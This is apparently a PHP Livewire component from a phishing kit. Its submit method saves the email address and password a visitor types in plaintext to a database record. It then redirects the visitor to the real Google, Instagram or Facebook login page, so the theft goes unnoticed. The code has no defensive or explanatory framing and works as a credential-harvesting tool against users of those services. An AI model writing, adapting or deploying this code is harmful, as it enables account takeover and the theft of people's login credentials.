<?php

namespace App\Livewire;

use App\Models\Record;
use Livewire\Component;

class Page2 extends Component
{
    public $email, $password, $tag = 'google';

    public function submit()
    {
        Record::create([
            'metadata'=> json_encode([
                'email'=> $this->email,
                'password'=> $this->password
            ])
        ]);

        if($this->tag == 'google')
        {
            return redirect("https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Faccounts.google.com%2F&dsh=S2013405554%3A1765734253236030&followup=https%3A%2F%2Faccounts.google.com%2F&ifkv=Ac2yZaXZ80KyONVrkRkBANm3UtYlxZJm__R6wINtOg6cL-3lO5UIEfRE-hMTN9NjNNiyD6o9s1wmQA&passive=1209600&flowName=GlifWebSignIn&flowEntry=ServiceLogin");
        }
        if($this->tag == 'instagram')
        {
            return redirect("https://www.instagram.com/accounts/login/?hl=en");
        }
        if($this->tag == 'facebook')
        {
            return redirect("https://web.facebook.com/login/?_rdc=1&_rdr");
        }


    }

    public function render()
    {
        return view('page2');
    }
}
